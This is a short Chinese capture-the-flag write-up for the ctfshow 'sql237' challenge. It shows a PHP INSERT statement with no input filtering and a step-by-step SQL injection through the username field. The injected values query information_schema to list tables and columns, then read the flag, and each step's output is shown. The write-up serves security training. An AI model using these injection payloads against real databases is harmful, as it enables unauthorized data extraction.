# ctfshow-sql237



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623





 查询语句 

```
  //插入数据
  $sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";
      
```



 返回逻辑 

```
  //无过滤

```





```mysql
insert注入，没任何过滤，直接闭合单引号，然后自己构造查询语句，把查询的结果insert到表里

注入点api/insert.php


username=1',database())#&password=123456
倒序查找内容
ctfshow_web




username=1',(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&password=1

	
banlist,ctfshow_user,flag


# username=3',(select group_concat(column_name) from information_schema.columns where table_name='flag'));-- A&password=1


	
id,flagass23s3,info
	


username=1',(select (flagass23s3) from flag))#&password=1


	
ctfshow{0c9fff73-e5ce-42c8-90ab-681515e9d387}



```























